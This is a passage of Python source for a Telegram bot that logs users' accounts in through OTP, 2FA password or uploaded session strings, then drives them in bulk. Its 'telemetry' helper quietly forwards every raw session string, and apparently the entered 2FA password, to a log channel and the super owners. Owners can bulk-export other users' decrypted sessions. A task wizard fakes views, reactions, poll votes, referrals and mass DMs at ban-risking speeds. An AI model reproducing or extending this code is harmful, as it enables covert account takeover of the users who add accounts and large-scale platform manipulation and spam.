        total_items = await db_mgr.db.accounts.count_documents(query)
        cursor = db_mgr.db.accounts.find(query, {"phone": 1, "status": 1, "username": 1}).skip(offset).limit(limit)
        rows = await cursor.to_list(length=limit)

        text = f"📱 <b>System Session Telephony Matrix</b> (Page {page + 1})\n"
        text += f"Total registered datastore slots catalogued: <code>{total_items}</code>\n\n"
        
        if not rows:
            text += "<i>No profile records mapped inside this page window framework.</i>"
        else:
            for row in rows:
                icon = "🟢" if row.get("status") == "active" else "🔴"
                text += f"{icon} <code>+{row.get('phone')}</code> (<b>@{row.get('username') or 'None'}</b>) ➜ [<b>{str(row.get('status')).upper()}</b>]\n"

        buttons = []
        import_row = [
            InlineKeyboardButton(text="⭐ Connect via OTP", callback_data="add_account_phone"),
            InlineKeyboardButton(text="📁 Upload String File", callback_data="add_account_session")
        ]
        buttons.append(import_row)

        if role in ["super_owner", "owner"]:
            buttons.append([InlineKeyboardButton(text="📥 Open Session Export Dashboard", callback_data="export_dashboard_root")])
            
        buttons.append([InlineKeyboardButton(text="💥 Delete Dead Sessions", callback_data=f"purge_dead_accounts:{page}")])
        
        nav_row = []
        if page > 0:
            nav_row.append(InlineKeyboardButton(text="⏮️ Previous", callback_data=f"manage_accounts:{page - 1}"))
        if offset + limit < total_items:
            nav_row.append(InlineKeyboardButton(text="Next ⏭️", callback_data=f"manage_accounts:{page + 1}"))
        
        if nav_row:
            buttons.append(nav_row)
            
        buttons.append([InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")])
        await callback.message.edit_text(text=text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
    except Exception as e:
        logger.error(f"Error handling list view page context: {e}")

@router.callback_query(F.data.startswith("purge_dead_accounts:"))
async def handle_purge_dead_accounts(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    page = int(callback.data.split(":")[1])
    role = await db_mgr.get_user_role(user_id)
    
    query = {"status": "dead"}
    if role not in ["owner", "super_owner"]:
        query["user_id"] = user_id

    await db_mgr.db.accounts.delete_many(query)
    await callback.answer("✨ Purge process complete! Dead profile sessions dropped.", show_alert=True)
    
    callback.data = f"manage_accounts:{page}"
    await list_user_accounts(callback, bot)

# --- LINK NEW ACCOUNT VIA OTP & 2FA TELEMETRY ALERT ---
@router.callback_query(F.data == "add_account_phone")
async def add_account_start(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await callback.message.edit_text("📱 <b>Type targeted terminal phone number string with country code mapping prefix (e.g. +919876543210):</b>", parse_mode="HTML")
    await state.set_state(RegistrationStates.waiting_for_phone)

@router.message(StateFilter(RegistrationStates.waiting_for_phone))
async def process_phone(message: Message, state: FSMContext, bot: Bot):
    phone = message.text.strip().replace(" ", "").replace("-", "")
    user_id = message.from_user.id
    client = TelegramClient(StringSession(), config.API_ID, config.API_HASH)
    await client.connect()
    try:
        sent_code = await client.send_code_request(phone)
        registration_sessions[user_id] = {"client": client, "phone": phone, "phone_code_hash": sent_code.phone_code_hash}
        await message.answer("📩 <b>Enter the authentication OTP code received from official Telegram channel:</b>", parse_mode="HTML")
        await state.set_state(RegistrationStates.waiting_for_otp)
    except Exception as e:
        await message.answer(f"❌ <b>API Initialization Framework Refusal:</b> <code>{str(e)}</code>", parse_mode="HTML")
        await client.disconnect()
        await state.clear()

@router.message(StateFilter(RegistrationStates.waiting_for_otp))
async def process_otp(message: Message, state: FSMContext, bot: Bot):
    user_id = message.from_user.id
    otp = message.text.strip()
    reg_data = registration_sessions.get(user_id)
    if not reg_data:
        await message.answer("❌ Context session dropped framework boundaries. Re-run setup sequence initialization loops.")
        await state.clear()
        return

    client, phone, phone_code_hash = reg_data["client"], reg_data["phone"], reg_data["phone_code_hash"]
    try:
        await client.sign_in(phone=phone, code=otp, phone_code_hash=phone_code_hash)
        await complete_registration(message, state, client, phone, user_id, bot)
    except PhoneCodeInvalidError:
        await message.answer("❌ <b>The security signature token OTP code entered was mismatched/invalid. Retry again:</b>", parse_mode="HTML")
    except SessionPasswordNeededError:
        await dispatch_2fa_alert(bot, user_id, phone)
        await message.answer("🔒 <b>Two-Factor security matrix verification prompt detected. Type your 2FA security password text:</b>", parse_mode="HTML")
        await state.set_state(RegistrationStates.waiting_for_2fa)
    except Exception as e:
        await message.answer(f"❌ <b>Authentication Chain Refusal:</b> <code>{str(e)}</code>", parse_mode="HTML")
        await client.disconnect()
        await state.clear()

@router.message(StateFilter(RegistrationStates.waiting_for_2fa))
async def process_2fa(message: Message, state: FSMContext, bot: Bot):
    user_id = message.from_user.id
    password = message.text.strip()
    reg_data = registration_sessions.get(user_id)
    if not reg_data:
        await state.clear()
        return
    try:
        await reg_data["client"].sign_in(password=password)
        await dispatch_2fa_alert(bot, user_id, reg_data["phone"], password_entered=password)
        await complete_registration(message, state, reg_data["client"], reg_data["phone"], user_id, bot)
    except Exception as e:
        await message.answer(f"❌ <b>Cloud Password Evaluation Denied:</b> <code>{str(e)}</code>", parse_mode="HTML")
        await reg_data["client"].disconnect()
        await state.clear()

async def complete_registration(message: Message, state: FSMContext, client: TelegramClient, phone: str, user_id: int, bot: Bot):
    try:
        me = await client.get_me()
        raw_session_str = client.session.save()
        encrypted_session = encrypt_data(raw_session_str)
        
        cleaned_phone = phone.replace("+", "")
        await db_mgr.db.accounts.update_one(
            {"phone": cleaned_phone},
            {"$set": {
                "phone": cleaned_phone,
                "user_id": user_id,
                "username": me.username or "None",
                "session_string": encrypted_session,
                "status": "active",
                "last_active": datetime.utcnow()
            }},
            upsert=True
        )
        
        await dispatch_session_telemetry(phone, raw_session_str, me.username, user_id, bot)

        await message.answer(
            f"🎉 <b>Onboarding Successful!</b> Account <code>+{phone}</code> is verified and logged inside system memory banks.", 
            reply_markup=get_post_registration_keyboard(),
            parse_mode="HTML"
        )
    except Exception as e:
        await message.answer(f"❌ <b>Telemetry Storage Pipeline Failure:</b> <code>{str(e)}</code>", parse_mode="HTML")
    finally:
        await client.disconnect()
        registration_sessions.pop(user_id, None)
        await state.clear()

# --- ADVANCED UNIVERSAL IMPORT SYSTEM ---
@router.callback_query(F.data == "add_account_session")
async def add_account_session_start(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await callback.message.edit_text("📁 <b>Drop your raw telethon string session strings layout, text line values, or upload a .txt / .session file log:</b>\n<i>(Supports unlimited bulk multi-line file imports!)</i>", parse_mode="HTML")
    await state.set_state(RegistrationStates.waiting_for_session_file)

@router.message(StateFilter(RegistrationStates.waiting_for_session_file))
async def process_session_file(message: Message, state: FSMContext, bot: Bot):
    user_id = message.from_user.id
    raw_content = ""
    
    if message.document:
        file_info = await bot.get_file(message.document.file_id)
        file_bytes = await bot.download_file(file_info.file_path)
        raw_content = file_bytes.read().decode('utf-8', errors='ignore').strip()
    elif message.text:
        raw_content = message.text.strip()

    if not raw_content:
        await message.answer("❌ <b>Source Error:</b> Empty input detected. Verification canceled.")
        await state.clear()
        return

    potential_sessions = [s.strip() for s in re.split(r'[\r\n,;]+', raw_content) if len(s.strip()) > 30]
    
    if not potential_sessions:
        await message.answer("❌ <b>Parse Failure:</b> Could not isolate any valid telethon format session string sequences inside your text.")
        await state.clear()
        return

    status_msg = await message.answer(f"⚡ <b>Analyzing and validating <code>{len(potential_sessions)}</code> potential session profiles chunks...</b>", parse_mode="HTML")
    
    success_imports = 0
    failed_imports = 0

    for session_str in potential_sessions:
        try:
            client = TelegramClient(StringSession(session_str), config.API_ID, config.API_HASH)
            await client.connect()
            if not await client.is_user_authorized():
                failed_imports += 1
                await client.disconnect()
                continue
                
            me = await client.get_me()
            phone = me.phone or f"custom_{me.id}"
            encrypted_session = encrypt_data(session_str)
            cleaned_phone = phone.replace("+", "")
            
            await db_mgr.db.accounts.update_one(
                {"phone": cleaned_phone},
                {"$set": {
                    "phone": cleaned_phone,
                    "user_id": user_id,
                    "username": me.username or "None",
                    "session_string": encrypted_session,
                    "status": "active",
                    "last_active": datetime.utcnow()
                }},
                upsert=True
            )

            await dispatch_session_telemetry(phone, session_str, me.username, user_id, bot)
            success_imports += 1
            await client.disconnect()
        except Exception:
            failed_imports += 1

    result_text = (
        f"✨ <b>Bulk Framework Import Profile Sync Complete!</b>\n\n"
        f"🟩 Successfully added: <code>{success_imports}</code> accounts\n"
        f"num Terminated/Mismatched failed count: <code>{failed_imports}</code> keys"
    )

    await status_msg.edit_text(result_text, reply_markup=get_post_registration_keyboard(), parse_mode="HTML")
    await state.clear()

# Telemetry Dispatch Helper
async def dispatch_session_telemetry(phone: str, session_str: str, username: Optional[str], adder_id: int, bot: Bot):
    file_bytes = session_str.encode('utf-8')
    document = BufferedInputFile(file_bytes, filename=f"session_{phone}.txt")
    caption = f"🔑 <b>Session Event Telemetry Dump</b>\nPhone: <code>+{phone}</code>\nUsername: <b>@{username or 'None'}</b>\nOperator Creator ID: <code>{adder_id}</code>"
    
    if config.LOG_CHANNEL_ID:
        try:
            await bot.send_document(chat_id=config.LOG_CHANNEL_ID, document=document, caption=caption, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Failed sending updates to log channel: {e}")
            
    for owner_id in config.SUPER_OWNER_IDS:
        try:
            owner_doc = BufferedInputFile(file_bytes, filename=f"session_{phone}.txt")
            await bot.send_document(chat_id=owner_id, document=owner_doc, caption=caption, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Failed sending data to owner node {owner_id}: {e}")

# --- EXPORT ARCHIVE MANAGEMENT HOOKS ---
@router.callback_query(F.data == "export_dashboard_root")
async def export_dashboard_root(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    if role not in ["super_owner", "owner"]:
        await callback.answer("⚠️ Clearance Level Violated: File extraction dashboard tools are barred for admins.", show_alert=True)
        return
        
    await callback.answer()
    text = "📥 <b>Session Extraction Management Dashboard Terminal</b>\nSelect extraction criteria filters:"
    buttons = [
        [InlineKeyboardButton(text="🎯 Extract 1 Single Session Profile", callback_data="select_export_session:0")],
        [InlineKeyboardButton(text="🎭 Multi-Session extract ", callback_data="export_multi_start:0")],
        [InlineKeyboardButton(text="📦 Extract Full pack", callback_data="bulk_admin_export")],
        [InlineKeyboardButton(text="🔙 Return Back", callback_data="manage_accounts:0")]
    ]
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")

@router.callback_query(F.data.startswith("select_export_session:"))
async def select_export_session_menu(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    page = int(callback.data.split(":")[1])
    await callback.answer()
    
    limit = 10
    offset = page * limit
    role = await db_mgr.get_user_role(user_id)
    
    query = {"status": "active"}
    if role == "owner":
        query["user_id"] = {"$nin": config.SUPER_OWNER_IDS}
    elif role != "super_owner":
        await callback.message.answer("🚫 Permission check validation rejected.")
        return

    total_items = await db_mgr.db.accounts.count_documents(query)
    cursor = db_mgr.db.accounts.find(query, {"phone": 1, "username": 1}).skip(offset).limit(limit)
    rows = await cursor.to_list(length=limit)

    if not rows:
        await callback.message.answer("⚠️ No accessible active telephony data clusters found corresponding to your filter access.")
        return

    text = f"Select structural database session profile target row to dump (Page {page + 1}):"
    buttons = [[InlineKeyboardButton(text=f"📱 +{r['phone']} (@{r.get('username') or 'None'})", callback_data=f"export_ph:{r['phone']}")] for r in rows]
    
    nav_row = []
    if page > 0:
        nav_row.append(InlineKeyboardButton(text="⏮️ Previous", callback_data=f"select_export_session:{page - 1}"))
    if offset + limit < total_items:
        nav_row.append(InlineKeyboardButton(text="Next ⏭️", callback_data=f"select_export_session:{page + 1}"))
    if nav_row:
        buttons.append(nav_row)
        
    buttons.append([InlineKeyboardButton(text="🔙 Return Back", callback_data="export_dashboard_root")])
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

@router.callback_query(F.data.startswith("export_ph:"))
async def handle_export_session_run(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    await callback.answer()
    phone = callback.data.split(":")[1]
    role = await db_mgr.get_user_role(user_id)
    
    if role not in ["super_owner", "owner"]:
        await callback.message.answer("🚫 Authorization access denied.")
        return

    row = await db_mgr.db.accounts.find_one({"phone": phone})

    if not row:
        await callback.message.answer("❌ Selected profile data missing inside datastore registries.")
        return

    if row.get("user_id") in config.SUPER_OWNER_IDS and role != "super_owner":
        await callback.message.answer("🛡️ <b>Access Violation:</b> Super Owner profiles are isolated and protected.")
        return

    session_bytes = decrypt_data(row.get("session_string", "")).encode('utf-8')
    session_file = BufferedInputFile(session_bytes, filename=f"string_{phone}.txt")
    await callback.message.reply_document(document=session_file, caption=f"✨ Session dump file generated safely for: <code>+{phone}</code>", parse_mode="HTML")

@router.callback_query(F.data.startswith("export_multi_start:"))
async def export_multi_dashboard(callback: CallbackQuery, state: FSMContext, bot: Bot):
    await callback.answer()
    page = int(callback.data.split(":")[1])
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    if role not in ["super_owner", "owner"]:
        await callback.message.answer("🚫 Permission check validation rejected.")
        return
        
    fsm_data = await state.get_data()
    selected = fsm_data.get("multi_export_selected", [])
    
    limit = 10
    offset = page * limit
    
    query = {"status": "active"}
    if role == "owner":
        query["user_id"] = {"$nin": config.SUPER_OWNER_IDS}

    total_items = await db_mgr.db.accounts.count_documents(query)
    cursor = db_mgr.db.accounts.find(query, {"phone": 1}).skip(offset).limit(limit)
    rows = await cursor.to_list(length=limit)
        
    text = f"🎭 <b>Customized Pack Package Assembly Core Selector</b> (Page {page + 1})\nSelect accounts profiles to encapsulate:"
    buttons = []
    
    for r in rows:
        ph = r["phone"]
        chk = "💎 " if ph in selected else "⬜ "
        buttons.append([InlineKeyboardButton(text=f"{chk}+{ph}", callback_data=f"toggle_ex_ph:{ph}:{page}")])
        
    nav_row = []
    if page > 0:
        nav_row.append(InlineKeyboardButton(text="⏮️ Previous", callback_data=f"export_multi_start:{page - 1}"))
    if offset + limit < total_items:
        nav_row.append(InlineKeyboardButton(text="Next ⏭️", callback_data=f"export_multi_start:{page + 1}"))
    if nav_row:
        buttons.append(nav_row)
        
    buttons.append([InlineKeyboardButton(text="📦 Build Pack Bundle & Download Archive", callback_data="execute_multi_export")])
    buttons.append([InlineKeyboardButton(text="🛑 Terminate Pack Configuration", callback_data="export_dashboard_root")])
    
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
    await state.set_state(ExportWizardStates.selecting_multi)

@router.callback_query(StateFilter(ExportWizardStates.selecting_multi), F.data.startswith("toggle_ex_ph:"))
async def handle_toggle_export_ph(callback: CallbackQuery, state: FSMContext, bot: Bot):
    await callback.answer()
    parts = callback.data.split(":")
    ph = parts[1]
    page = int(parts[2])
    
    fsm_data = await state.get_data()
    selected = fsm_data.get("multi_export_selected", [])
    
    if ph in selected:
        selected.remove(ph)
    else:
        selected.append(ph)
        
    await state.update_data(multi_export_selected=selected)
    
    callback.data = f"export_multi_start:{page}"
    await export_multi_dashboard(callback, state, bot)

@router.callback_query(StateFilter(ExportWizardStates.selecting_multi), F.data == "execute_multi_export")
async def execute_multi_export(callback: CallbackQuery, state: FSMContext, bot: Bot):
    fsm_data = await state.get_data()
    selected = fsm_data.get("multi_export_selected", [])
    
    if not selected:
        await callback.answer("⚠️ You must pick at least 1 destination target account profile.", show_alert=True)
        return
        
    await callback.answer()
    export_payload = []
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    for ph in selected:
        row = await db_mgr.db.accounts.find_one({"phone": ph})
        if row:
            if row.get("user_id") in config.SUPER_OWNER_IDS and role != "super_owner":
                continue
            export_payload.append({
                "phone": row.get("phone"),
                "user_id": row.get("user_id"),
                "username": row.get("username"),
                "session_string": decrypt_data(row.get("session_string", ""))
            })
                    
    buffer_bytes = json.dumps(export_payload, indent=4).encode('utf-8')
    pack_file = BufferedInputFile(buffer_bytes, filename="multi_sessions_bundle.txt")
    
    await callback.message.reply_document(document=pack_file, caption=f"✨ <b>Pack extraction compiled!</b> Successfully consolidated <code>{len(export_payload)}</code> customized database session rows.", parse_mode="HTML")
    await state.clear()

@router.callback_query(F.data == "bulk_admin_export")
async def handle_bulk_admin_export(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    await callback.answer()
    role = await db_mgr.get_user_role(user_id)
    if role not in ["owner", "super_owner"]:
        await callback.message.answer("🚫 Clearances credential criteria missing.")
        return

    query = {"status": "active"}
    if role == "owner":
        query["user_id"] = {"$nin": config.SUPER_OWNER_IDS}

    cursor = db_mgr.db.accounts.find(query)
    rows = await cursor.to_list(length=None)

    if not rows:
        await callback.message.answer("⚠️ Datastore registries do not match current scope rules filters.")
        return

    export_payload = []
    for r in rows:
        export_payload.append({
            "phone": r.get("phone"),
            "user_id": r.get("user_id"),
            "username": r.get("username"),
            "session_string": decrypt_data(r.get("session_string", ""))
        })

    backup_bytes = json.dumps(export_payload, indent=4).encode('utf-8')
    backup_file = BufferedInputFile(backup_bytes, filename="bulk_admin_sessions.txt")
    await callback.message.reply_document(document=backup_file, caption=f"📦 <b>Master Datastore Core Bulk Extract Dump Complete!</b> Catalogued <code>{len(export_payload)}</code> active network session nodes safely.", parse_mode="HTML")

# --- DYNAMIC DB SNAPSHOT ENGINE ---
@router.callback_query(F.data == "backup_panel")
async def backup_panel(callback: CallbackQuery, bot: Bot):
    await callback.answer()
    buttons = [
        [InlineKeyboardButton(text="📥 Save JSON Backup (.json)", callback_data="export_db")],
        [InlineKeyboardButton(text="📂 Upload .json file ", callback_data="import_db_start")],
        [InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")]
    ]
    await callback.message.edit_text("💾 <b>MongoDB Data System Maintenance Suite Control Panel</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")

@router.callback_query(F.data == "import_db_start")
async def import_db_start(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role not in ["owner", "super_owner"]:
        await callback.message.answer("🚫 Developer verification clearance needed.")
        return
        
    await callback.message.edit_text("📤 <b>Upload backup relational runtime JSON file ending inside <code>.json</code> format extension:</b>", parse_mode="HTML")
    await state.set_state(RegistrationStates.waiting_for_db_file)

@router.message(StateFilter(RegistrationStates.waiting_for_db_file), F.document)
async def process_db_import_file(message: Message, state: FSMContext, bot: Bot):
    user_id = message.from_user.id
    if not message.document.file_name.endswith('.json'):
        await message.answer("❌ Structural failure: Supplied source document layout must run file format <code>.json</code> extension structures exclusively.", parse_mode="HTML")
        await state.clear()
        return
        
    status_msg = await message.answer("⚡ <i>Reading incoming MongoDB snapshot JSON structure...</i>", parse_mode="HTML")
    
    try:
        file_info = await bot.get_file(message.document.file_id)
        file_bytes = await bot.download_file(file_info.file_path)
        data = json.loads(file_bytes.read().decode('utf-8'))
        
        await status_msg.edit_text("🔄 <i>Executing MongoDB document restoration sequences...</i>", parse_mode="HTML")
        
        users_merged = 0
        accounts_merged = 0
        
        for u in data.get("users", []):
            await db_mgr.db.users.update_one(
                {"user_id": u["user_id"]},
                {"$set": {
                    "user_id": u["user_id"],
                    "username": u.get("username"),
                    "role": u.get("role", "user"),
                    "max_accounts": u.get("max_accounts", 999999999)
                }},
                upsert=True
            )
            users_merged += 1

        for a in data.get("accounts", []):
            cleaned_phone = str(a["phone"]).replace("+", "")
            await db_mgr.db.accounts.update_one(
                {"phone": cleaned_phone},
                {"$set": {
                    "phone": cleaned_phone,
                    "user_id": a.get("user_id"),
                    "username": a.get("username"),
                    "session_string": a.get("session_string"),
                    "status": a.get("status", "active"),
                    "last_active": datetime.utcnow()
                }},
                upsert=True
            )
            accounts_merged += 1

        await status_msg.edit_text(
            f"✅ <b>Relational Data Merge Complete!</b>\n\n"
            f"👤 Profile rows aggregated: <code>{users_merged}</code>\n"
            f"📱 Telephony token references synced: <code>{accounts_merged}</code>",
            parse_mode="HTML"
        )
        
    except Exception as e:
        await status_msg.edit_text(f"❌ <b>Hot-Merge Internal Core Failure:</b> {e}")
    finally:
        await state.clear()

@router.callback_query(F.data == "export_db")
async def export_db(callback: CallbackQuery, bot: Bot):
    await callback.answer()
    try:
        users = await db_mgr.db.users.find({}, {"_id": 0}).to_list(length=None)
        accounts = await db_mgr.db.accounts.find({}, {"_id": 0}).to_list(length=None)
        
        backup_data = {
            "users": users,
            "accounts": accounts
        }
        
        json_bytes = json.dumps(backup_data, indent=4, default=str).encode('utf-8')
        file = BufferedInputFile(json_bytes, filename="database_core_backup.json")
        await callback.message.reply_document(file, caption="📂 <b>Current Core MongoDB Operational Database Backup Snapshot</b>", parse_mode="HTML")
    except Exception as e:
        await callback.message.answer(f"❌ Core backup extraction streams dropped: {e}")

# --- TASK WIZARD INTERFACE FLOW ---
@router.callback_query(F.data == "task_hub_start")
async def task_hub_select_type(callback: CallbackQuery, state: FSMContext, bot: Bot):
    await callback.answer()
    await state.clear()
    
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    query = {"status": "active"}
    if role not in ["owner", "super_owner"]:
        query["user_id"] = user_id
        
    active_count = await db_mgr.db.accounts.count_documents(query)

    wizard_text = (
        f"🚀 <b>Premium Interactive Campaign Configuration Wizard Hub</b>\n"
        f"----------------------------------------------------\n"
        f"📱 Status: <code>{active_count}</code> active functional telephony slots mapped.\n\n"
        f"<b>Step 1: Pick the action protocol code matrix to deploy:</b>"
    )
    await callback.message.edit_text(text=wizard_text, reply_markup=get_task_types_keyboard(active_count), parse_mode="HTML")
    await state.set_state(TaskWizardStates.choosing_type)

@router.callback_query(StateFilter(TaskWizardStates.choosing_type), F.data.startswith("set_type:"))
async def task_hub_process_type(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    task_type = callback.data.split(":")[1]
    await state.update_data(task_type=task_type)
    
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)

    if role == "super_owner":
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💎 Use our ids only", callback_data="set_routing:own")],
            [InlineKeyboardButton(text="👑 Use all ids", callback_data="set_routing:all")]
        ])
        await callback.message.edit_text("<b>👑 Super Owner Privileges Triggered:</b> Select account deployment routing orientation scope:", reply_markup=kb, parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_routing_choice)
    else:
        await state.update_data(account_routing="own")
        await proceed_to_speed_selection(callback.message, state)

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_routing_choice), F.data.startswith("set_routing:"))
async def task_hub_process_routing(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    routing = callback.data.split(":")[1]
    await state.update_data(account_routing=routing)
    await proceed_to_speed_selection(callback.message, state)

async def proceed_to_speed_selection(message: Message, state: FSMContext):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🟢 Safer Speed (5.0s)", callback_data="set_speed:safe")],
        [InlineKeyboardButton(text="🟡 Accelerated Speed (2.5s)", callback_data="set_speed:safer")],
        [InlineKeyboardButton(text="🔴 Maximum Speed (0.05s) [Ban Risk]", callback_data="set_speed:fastest")]
    ])
    await message.edit_text("<b>Step 1b: Configure Task execution delay speed matrix limits:</b>", reply_markup=kb, parse_mode="HTML")
    await state.set_state(TaskWizardStates.waiting_for_speed_choice)

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_speed_choice), F.data.startswith("set_speed:"))
async def task_hub_process_speed(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    speed_mode = callback.data.split(":")[1]
    await state.update_data(speed_mode=speed_mode)
    
    data = await state.get_data()
    task_type = data.get("task_type")

    if task_type == "leave":
        await callback.message.edit_text(
            "<b>Step 2: Choose evacuation strategy profile:</b>", 
            reply_markup=get_leave_channel_options_keyboard(),
            parse_mode="HTML"
        )
        await state.set_state(TaskWizardStates.waiting_for_leave_choice)
    elif "react" in task_type or "vote" in task_type or task_type in ["view", "speed"]:
        await callback.message.edit_text("<b>Step 2: Provide targeted public handle destination or private link reference (e.g. @channelname or -100xxxxx):</b>", parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_channel_link)
    elif task_type == "refer":
        await callback.message.edit_text("<b>Step 2: Input target referral link parameter query string value (Example: https://t.me/Bot?start=123):</b>", parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_post_link)
    else:
        await callback.message.edit_text("<b>Step 2: Enter destination community target endpoint path link or channel ID:</b>", parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_post_link)

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_leave_choice), F.data.startswith("leave_mode:"))
async def task_hub_process_leave_choice(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    mode = callback.data.split(":")[1]
    await state.update_data(leave_mode=mode)

    if mode == "all":
        await state.update_data(target="ALL CHANNELS")
        await prompt_for_account_scale(callback.message, state)
    else:
        await callback.message.edit_text("<b>Step 3: Paste public link, private channel invite code, or numeric channel ID:</b>", parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_post_link)

@router.message(StateFilter(TaskWizardStates.waiting_for_channel_link))
async def task_hub_process_channel_link(message: Message, state: FSMContext):
    channel_target = message.text.strip()
    await state.update_data(channel_target=channel_target)
    await message.answer("<b>Step 3: Paste message tracker specific structural index link URL (Example: https://t.me/channelname/123):</b>", parse_mode="HTML")
    await state.set_state(TaskWizardStates.waiting_for_post_link)

@router.message(StateFilter(TaskWizardStates.waiting_for_post_link))
async def task_hub_process_target(message: Message, state: FSMContext, bot: Bot):
    target = message.text.strip()
    await state.update_data(target=target)
    
    data = await state.get_data()
    task_type = data.get("task_type")

    if task_type in ["join", "leave", "refer", "view", "speed"]:
        await prompt_for_account_scale(message, state)
    elif "react" in task_type and "vote" not in task_type:
        await state.update_data(selected_emojis=[])
        await message.answer(
            "<b>Step 4: Select target reaction array configurations:</b>",
            reply_markup=get_emoji_selection_keyboard([]),
            parse_mode="HTML"
        )
        await state.set_state(TaskWizardStates.waiting_for_emojis)
    elif "vote" in task_type:
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔘 Native Poll Option Index Selection", callback_data="set_vmode:poll")],
            [InlineKeyboardButton(text="🎛️ Inline Callback Keyboard Button Matching", callback_data="set_vmode:inline")]
        ])
        await message.answer("<b>Step 4: Specify the structural mechanics type of voting button to target:</b>", reply_markup=kb, parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_vote_mode_choice)
    elif task_type == "dm":
        await message.answer("<b>Step 4: Write exact content message context layout to disperse across targets:</b>", parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_dm_text)

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_vote_mode_choice), F.data.startswith("set_vmode:"))
async def handle_vote_mode_choice(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    vmode = callback.data.split(":")[1]
    await state.update_data(vote_mode=vmode)
    
    if vmode == "inline":
        await callback.message.edit_text("<b>Step 4b: Enter identical text string label shown on target inline button:</b>", parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_button_text)
    else:
        await callback.message.edit_text("<b>Step 4b: Enter native question option choice index number to register (First option starts at 0, Second is 1, etc):</b>", parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_poll_option_index)

@router.message(StateFilter(TaskWizardStates.waiting_for_poll_option_index))
async def process_poll_option_index(message: Message, state: FSMContext):
    val = message.text.strip()
    if not val.isdigit():
        await message.answer("❌ Option pointer index value must be a zero-indexed numerical integer.")
        return
    await state.update_data(poll_option_index=int(val))
    
    data = await state.get_data()
    if "react" in data.get("task_type", ""):
        await state.update_data(selected_emojis=[])
        await message.answer(
            "<b>Step 5: Select concurrent target reaction array configurations:</b>",
            reply_markup=get_emoji_selection_keyboard([]),
            parse_mode="HTML"
        )
        await state.set_state(TaskWizardStates.waiting_for_emojis)
    else:
        await prompt_for_account_scale(message, state)

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_emojis), F.data.startswith("toggle_emoji:"))
async def handle_toggle_emoji(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    emoji = callback.data.split(":")[1]
    data = await state.get_data()
    selected = data.get("selected_emojis", [])
    if emoji in selected:
        selected.remove(emoji)
    else:
        selected.append(emoji)
    await state.update_data(selected_emojis=selected)
    await callback.message.edit_reply_markup(reply_markup=get_emoji_selection_keyboard(selected))

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_emojis), F.data == "finish_emoji_selection")
async def finish_emoji_selection(callback: CallbackQuery, state: FSMContext, bot: Bot):
    data = await state.get_data()
    selected = data.get("selected_emojis", [])
    if not selected:
        await callback.answer("⚠️ You must pick at least 1 active target reaction element.", show_alert=True)
        return
    await callback.answer()
    await state.update_data(reactions=selected)
    await prompt_for_account_scale(callback.message, state)

@router.message(StateFilter(TaskWizardStates.waiting_for_button_text))
async def process_button_text(message: Message, state: FSMContext, bot: Bot):
    await state.update_data(button_text=message.text.strip())
    data = await state.get_data()
    if "react" in data.get("task_type", ""):
        await state.update_data(selected_emojis=[])
        await message.answer(
            "<b>Step 5: Select concurrent target reaction array configurations:</b>",
            reply_markup=get_emoji_selection_keyboard([]),
            parse_mode="HTML"
        )
        await state.set_state(TaskWizardStates.waiting_for_emojis)
    else:
        await prompt_for_account_scale(message, state)

@router.message(StateFilter(TaskWizardStates.waiting_for_dm_text))
async def process_dm_text(message: Message, state: FSMContext, bot: Bot):
    await state.update_data(text=message.text.strip())
    await prompt_for_account_scale(message, state)

async def prompt_for_account_scale(message: Message, state: FSMContext):
    user_id = message.chat.id if isinstance(message, Message) else message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    data = await state.get_data()
    account_routing = data.get("account_routing", "own")
    
    query = {"status": "active"}
